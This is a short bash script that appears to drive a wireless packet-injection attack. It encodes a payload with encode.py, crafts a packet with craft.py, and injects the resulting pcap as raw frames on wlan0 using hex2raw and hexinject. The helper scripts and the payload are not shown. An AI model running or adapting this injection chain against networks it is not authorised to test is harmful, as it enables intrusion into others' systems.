#!/bin/bash

#encode payload with key to payload
python encode.py > payload

#make packet
python craft.py

#send
cat werk.pcap | hex2raw -r | hexinject -p -i wlan0

